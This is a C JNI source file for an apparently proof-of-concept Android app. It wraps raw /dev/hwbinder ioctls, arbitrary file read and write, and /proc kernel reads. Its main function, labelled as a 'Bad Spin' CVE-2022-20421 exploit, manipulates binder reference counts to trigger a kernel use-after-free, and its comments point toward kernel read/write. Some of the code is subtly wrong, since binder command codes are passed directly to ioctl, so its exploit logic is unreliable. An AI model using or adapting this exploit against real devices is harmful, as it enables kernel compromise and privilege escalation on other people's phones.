#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <android/log.h>
#include <sys/stat.h>
#include <limits.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>

// Binder kernel header
#include "binder.h"

#define LOG_TAG "PocJNI"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

static JavaVM* g_vm = NULL;

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) {
    g_vm = vm;
    LOGD("JNI_OnLoad");
    return JNI_VERSION_1_6;
}

JNIEXPORT void JNICALL JNI_OnUnload(JavaVM* vm, void* reserved) {
    LOGD("JNI_OnUnload");
}

// ---------- basic file operations ----------
JNIEXPORT jobjectArray JNICALL
Java_com_example_tzpoc_MainActivity_nativeListDir(JNIEnv* env, jclass clazz, jstring path) {
    if (path == NULL) return NULL;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    if (cpath == NULL) return NULL;

    DIR* dir = opendir(cpath);
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    if (dir == NULL) return NULL;

    int count = 0;
    struct dirent* entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] != '.') count++;
    }
    rewinddir(dir);

    jclass stringClass = (*env)->FindClass(env, "java/lang/String");
    if (stringClass == NULL) { closedir(dir); return NULL; }
    jobjectArray result = (*env)->NewObjectArray(env, count, stringClass, NULL);
    if (result == NULL) { closedir(dir); return NULL; }

    int idx = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] == '.') continue;
        jstring name = (*env)->NewStringUTF(env, entry->d_name);
        if (name != NULL) {
            (*env)->SetObjectArrayElement(env, result, idx++, name);
            (*env)->DeleteLocalRef(env, name);
        }
    }
    closedir(dir);
    return result;
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeReadFile(JNIEnv* env, jclass clazz, jstring path) {
    if (path == NULL) return NULL;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    if (cpath == NULL) return NULL;
    int fd = open(cpath, O_RDONLY);
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    if (fd < 0) return NULL;
    char buf[8192];
    ssize_t len = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (len <= 0) return NULL;
    buf[len] = '\0';
    return (*env)->NewStringUTF(env, buf);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeWriteFile(JNIEnv* env, jclass clazz, jstring path, jstring content) {
    if (path == NULL || content == NULL) return NULL;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    const char* ccontent = (*env)->GetStringUTFChars(env, content, NULL);
    if (cpath == NULL || ccontent == NULL) {
        if (cpath) (*env)->ReleaseStringUTFChars(env, path, cpath);
        if (ccontent) (*env)->ReleaseStringUTFChars(env, content, ccontent);
        return NULL;
    }
    int fd = open(cpath, O_WRONLY);
    if (fd < 0) {
        (*env)->ReleaseStringUTFChars(env, path, cpath);
        (*env)->ReleaseStringUTFChars(env, content, ccontent);
        return (*env)->NewStringUTF(env, strerror(errno));
    }
    ssize_t written = write(fd, ccontent, strlen(ccontent));
    close(fd);
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    (*env)->ReleaseStringUTFChars(env, content, ccontent);
    if (written < 0) return (*env)->NewStringUTF(env, strerror(errno));
    return (*env)->NewStringUTF(env, "OK");
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeReadLink(JNIEnv* env, jclass clazz, jstring path) {
    if (path == NULL) return NULL;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    if (cpath == NULL) return NULL;
    char buf[PATH_MAX];
    ssize_t len = readlink(cpath, buf, sizeof(buf)-1);
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    if (len < 0) return NULL;
    buf[len] = '\0';
    return (*env)->NewStringUTF(env, buf);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeGetKernelInfo(JNIEnv* env, jclass clazz) {
    char result[4096] = {0};
    const char* files[] = {
        "/proc/version", "/proc/cmdline", "/proc/meminfo",
        "/proc/self/status", "/proc/self/stat"
    };
    char buf[1024];
    for (size_t i = 0; i < sizeof(files)/sizeof(files[0]); i++) {
        int fd = open(files[i], O_RDONLY);
        if (fd >= 0) {
            ssize_t n = read(fd, buf, sizeof(buf)-1);
            close(fd);
            if (n > 0) {
                buf[n] = '\0';
                strcat(result, files[i]);
                strcat(result, ": ");
                strcat(result, buf);
                strcat(result, "\n");
            }
        }
    }
    return (*env)->NewStringUTF(env, result);
}

// ---------- Binder operations ----------
JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderOpen(JNIEnv* env, jclass clazz) {
    int fd = open("/dev/hwbinder", O_RDWR);
    if (fd < 0) {
        LOGE("Failed to open /dev/hwbinder: %s", strerror(errno));
        return -1;
    }
    return fd;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderVersion(JNIEnv* env, jclass clazz, jint fd) {
    struct binder_version version;
    if (ioctl(fd, BINDER_VERSION, &version) < 0) {
        LOGE("BINDER_VERSION failed: %s", strerror(errno));
        return -1;
    }
    return version.protocol_version;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderSetMaxThreads(JNIEnv* env, jclass clazz, jint fd, jint max) {
    if (ioctl(fd, BINDER_SET_MAX_THREADS, &max) < 0) {
        LOGE("BINDER_SET_MAX_THREADS failed: %s", strerror(errno));
        return -1;
    }
    return 0;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderCreateNode(JNIEnv* env, jclass clazz, jint fd, jlong ptr, jlong cookie) {
    struct flat_binder_object fbo = {
        .hdr.type = BINDER_TYPE_BINDER,
        .flags = 0,
        .binder = (binder_uintptr_t)ptr,
        .cookie = (binder_uintptr_t)cookie
    };
    // BINDER_SET_CONTEXT_MGR_EXT creates a node
    if (ioctl(fd, BINDER_SET_CONTEXT_MGR_EXT, &fbo) < 0) {
        LOGE("BINDER_SET_CONTEXT_MGR_EXT failed: %s", strerror(errno));
        return -1;
    }
    // The node handle for context manager is 0
    return 0;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderIncRef(JNIEnv* env, jclass clazz, jint fd, jint handle, jboolean strong) {
    uint32_t cmd = strong ? BC_ACQUIRE : BC_INCREFS;
    if (ioctl(fd, cmd, &handle) < 0) {
        LOGE("Binder inc ref failed: %s", strerror(errno));
        return -1;
    }
    return 0;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderDecRef(JNIEnv* env, jclass clazz, jint fd, jint handle, jboolean strong) {
    uint32_t cmd = strong ? BC_RELEASE : BC_DECREFS;
    if (ioctl(fd, cmd, &handle) < 0) {
        LOGE("Binder dec ref failed: %s", strerror(errno));
        return -1;
    }
    return 0;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderTransaction(JNIEnv* env, jclass clazz, jint fd, jint targetHandle, jint code, jbyteArray data, jbyteArray offsets) {
    jsize dataLen = data ? (*env)->GetArrayLength(env, data) : 0;
    jsize offLen = offsets ? (*env)->GetArrayLength(env, offsets) : 0;
    jbyte* dataPtr = data ? (*env)->GetByteArrayElements(env, data, NULL) : NULL;
    jbyte* offPtr = offsets ? (*env)->GetByteArrayElements(env, offsets, NULL) : NULL;

    struct binder_transaction_data tdata = {
        .target.handle = targetHandle,
        .cookie = 0,
        .code = code,
        .flags = 0,
        .sender_pid = getpid(),
        .sender_euid = getuid(),
        .data_size = dataLen,
        .offsets_size = offLen,
        .data.ptr.buffer = (binder_uintptr_t)dataPtr,
        .data.ptr.offsets = (binder_uintptr_t)offPtr
    };

    // Build BC_TRANSACTION command
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } tx = { .cmd = BC_TRANSACTION, .tdata = tdata };

    struct binder_write_read bwr = {
        .write_size = sizeof(tx),
        .write_buffer = (binder_uintptr_t)&tx,
        .read_size = sizeof(struct binder_transaction_data),
        .read_buffer = (binder_uintptr_t)calloc(1, sizeof(struct binder_transaction_data))
    };

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);

    if (dataPtr) (*env)->ReleaseByteArrayElements(env, data, dataPtr, 0);
    if (offPtr) (*env)->ReleaseByteArrayElements(env, offsets, offPtr, 0);
    if (bwr.read_buffer) free((void*)bwr.read_buffer);

    if (ret < 0) {
        LOGE("BINDER_WRITE_READ failed: %s", strerror(errno));
        return -1;
    }
    return bwr.read_consumed > 0 ? 1 : 0;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderRead(JNIEnv* env, jclass clazz, jint fd, jbyteArray buffer, jint size) {
    if (buffer == NULL) return -1;
    jsize len = (*env)->GetArrayLength(env, buffer);
    if (len < size) return -1;
    jbyte* ptr = (*env)->GetByteArrayElements(env, buffer, NULL);
    struct binder_write_read bwr = {
        .read_size = size,
        .read_buffer = (binder_uintptr_t)ptr
    };
    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    (*env)->ReleaseByteArrayElements(env, buffer, ptr, 0);
    if (ret < 0) return -1;
    return bwr.read_consumed;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderWrite(JNIEnv* env, jclass clazz, jint fd, jbyteArray buffer, jint size) {
    if (buffer == NULL) return -1;
    jsize len = (*env)->GetArrayLength(env, buffer);
    if (len < size) return -1;
    jbyte* ptr = (*env)->GetByteArrayElements(env, buffer, NULL);
    struct binder_write_read bwr = {
        .write_size = size,
        .write_buffer = (binder_uintptr_t)ptr
    };
    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    (*env)->ReleaseByteArrayElements(env, buffer, ptr, 0);
    if (ret < 0) return -1;
    return bwr.write_consumed;
}

// ---------- Bad Spin (CVE-2022-20421) Exploit ----------
JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderBadSpin(JNIEnv* env, jclass clazz, jint fd) {
    char result[1024] = {0};
    int ret;

    LOGD("Starting Bad Spin (CVE-2022-20421) exploit attempt...");

    // Step 1: Create a node
    struct flat_binder_object fbo = {
        .hdr.type = BINDER_TYPE_BINDER,
        .flags = 0,
        .binder = 0x123456789abcdef0ULL,
        .cookie = 0xfedcba9876543210ULL
    };
    ret = ioctl(fd, BINDER_SET_CONTEXT_MGR_EXT, &fbo);
    if (ret < 0) {
        snprintf(result, sizeof(result), "Failed to create node: %s", strerror(errno));
        return (*env)->NewStringUTF(env, result);
    }
    strcat(result, "Node created (handle 0).\n");

    // Step 2: Multiple inc/dec refs to manipulate refcount
    // This is the core of Bad Spin - we need to create a scenario where
    // the refcount becomes inconsistent and causes a use-after-free.
    int handle = 0;
    uint32_t cmd;

    // Inc strong ref multiple times
    for (int i = 0; i < 5; i++) {
        cmd = BC_ACQUIRE;
        ret = ioctl(fd, cmd, &handle);
        if (ret < 0) {
            snprintf(result, sizeof(result), "ACQUIRE %d failed: %s", i, strerror(errno));
            return (*env)->NewStringUTF(env, result);
        }
    }
    strcat(result, "Strong refs incremented 5 times.\n");

    // Step 3: Send a transaction to the node
    struct binder_transaction_data tdata = {
        .target.handle = 0,
        .cookie = 0,
        .code = 0x1234,
        .flags = 0,
        .data_size = 8,
        .offsets_size = 0,
        .data.ptr.buffer = (binder_uintptr_t)"hellobad"
    };
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } tx = { .cmd = BC_TRANSACTION, .tdata = tdata };
    struct binder_write_read bwr = {
        .write_size = sizeof(tx),
        .write_buffer = (binder_uintptr_t)&tx,
        .read_size = sizeof(struct binder_transaction_data),
        .read_buffer = (binder_uintptr_t)calloc(1, sizeof(struct binder_transaction_data))
    };
    ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (ret < 0) {
        snprintf(result, sizeof(result), "Transaction failed: %s", strerror(errno));
        if (bwr.read_buffer) free((void*)bwr.read_buffer);
        return (*env)->NewStringUTF(env, result);
    }
    strcat(result, "Transaction sent.\n");

    // Step 4: Try to cause the UAF by releasing refs
    // The vulnerability occurs when the refcount goes to zero while
    // there are still pending transactions referencing the node.
    for (int i = 0; i < 5; i++) {
        cmd = BC_RELEASE;
        ret = ioctl(fd, cmd, &handle);
        if (ret < 0) {
            LOGE("RELEASE %d failed: %s", i, strerror(errno));
        }
    }
    strcat(result, "Refs released (UAF may be triggered).\n");

    // Step 5: Try to use the freed node (should cause kernel crash if vulnerable)
    // Send another transaction to trigger the UAF
    tdata.code = 0x5678;
    tx.cmd = BC_TRANSACTION;
    tx.tdata = tdata;
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (ret < 0) {
        strcat(result, "UAF trigger: ");
        strcat(result, strerror(errno));
        strcat(result, "\n");
    } else {
        strcat(result, "UAF trigger: succeeded (device may be vulnerable)\n");
    }

    if (bwr.read_buffer) free((void*)bwr.read_buffer);

    // Step 6: Try to get kernel memory read/write primitive
    // This would require additional steps - we just log the attempt
    strcat(result, "Bad Spin exploit attempt completed.\n");
    strcat(result, "Note: Full kernel R/W requires heap spray and offset knowledge.\n");

    return (*env)->NewStringUTF(env, result);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderExploit(JNIEnv* env, jclass clazz, jint fd) {
    char result[512] = {0};

    // Get version
    struct binder_version version;
    if (ioctl(fd, BINDER_VERSION, &version) == 0) {
        snprintf(result, sizeof(result), "Binder protocol: %d. ", version.protocol_version);
    }

    // Try to set max threads
    int max_threads = 10;
    if (ioctl(fd, BINDER_SET_MAX_THREADS, &max_threads) == 0) {
        strcat(result, "Max threads set. ");
    }

    // Try to get node info
    struct binder_node_info_for_ref info = { .handle = 0 };
    if (ioctl(fd, BINDER_GET_NODE_INFO_FOR_REF, &info) == 0) {
        char tmp[64];
        snprintf(tmp, sizeof(tmp), "Node 0: strong=%u weak=%u. ", info.strong_count, info.weak_count);
        strcat(result, tmp);
    }

    // Try a simple transaction
    struct binder_transaction_data tdata = {
        .target.handle = 0,
        .code = 0,
        .flags = 0,
        .data_size = 0,
        .offsets_size = 0
    };
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } tx = { .cmd = BC_TRANSACTION, .tdata = tdata };
    struct binder_write_read bwr = {
        .write_size = sizeof(tx),
        .write_buffer = (binder_uintptr_t)&tx,
        .read_size = sizeof(struct binder_transaction_data),
        .read_buffer = (binder_uintptr_t)calloc(1, sizeof(struct binder_transaction_data))
    };
    if (ioctl(fd, BINDER_WRITE_READ, &bwr) == 0) {
        strcat(result, "Transaction succeeded. ");
        if (bwr.read_consumed > 0) {
            strcat(result, "Reply received. ");
        }
    } else {
        strcat(result, "Transaction failed. ");
    }
    if (bwr.read_buffer) free((void*)bwr.read_buffer);

    return (*env)->NewStringUTF(env, result);
}
